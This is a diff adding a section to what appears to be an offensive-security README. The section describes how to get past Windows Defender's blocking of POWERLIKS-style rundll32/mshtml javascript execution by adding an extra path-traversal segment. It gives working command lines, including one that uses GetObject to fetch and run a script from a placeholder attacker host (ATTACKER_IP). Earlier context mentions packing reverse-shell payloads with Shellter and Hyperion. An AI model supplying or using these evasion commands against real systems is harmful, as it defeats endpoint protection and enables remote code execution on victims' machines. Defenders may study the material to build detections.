@@ -37,3 +37,24 @@ wine hyperion.exe /root/payloads/shellter/shellter_putty_reverse_x86.exe /root/p
 # VirusTotal and YARA Detection 
 <img width="583" alt="Screen Shot 2021-12-03 at 5 22 12 PM" src="https://user-images.githubusercontent.com/72598486/144680778-e92bd81b-7a97-4559-a564-44ba0217cd0f.png">
 
+# Windows Defender Detection Bypass
+
+Currently, Windows Defender detects and prevents TrojanWin32Powessere.G aka "POWERLIKS" type execution that leverages rundll32.exe. Attempts at execution fail
+and attackers will get an "Access is denied" error message. However, it can be easily bypassed by passing an extra path traversal when referencing mshtml.
+
+```
+C:\>rundll32.exe javascript:"\..\..\mshtml,RunHTMLApplication ";alert(1)
+Access is denied.
+```
+
+Pass an extra "..\" to the path.
+
+```C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";alert(666)```
+
+Windows Defender also detects based on the following javascript call using GetObject("script:http://ATTACKER_IP/hi.tmp").
+However, that interference can be bypassed by using concatenation when constructing the URL scheme portion of the payload.
+
+```
+C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ATTACKER_IP/hi.tmp")
+Access is denied.
+```
